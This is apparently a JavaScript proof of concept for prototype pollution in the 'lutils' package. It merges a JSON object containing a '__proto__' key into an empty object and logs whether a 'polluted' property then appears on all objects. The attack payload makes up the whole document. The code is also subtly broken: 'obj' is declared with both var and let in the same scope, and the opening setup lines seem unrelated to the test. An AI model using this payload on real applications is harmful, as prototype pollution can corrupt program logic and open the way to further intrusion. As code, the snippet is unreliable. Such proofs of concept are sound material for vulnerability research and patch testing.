var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const lt = require('lutils');
let obj = {};
console.log({}.polluted);
let EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
lt.merge(obj, EVIL_JSON);
console.log({}.polluted);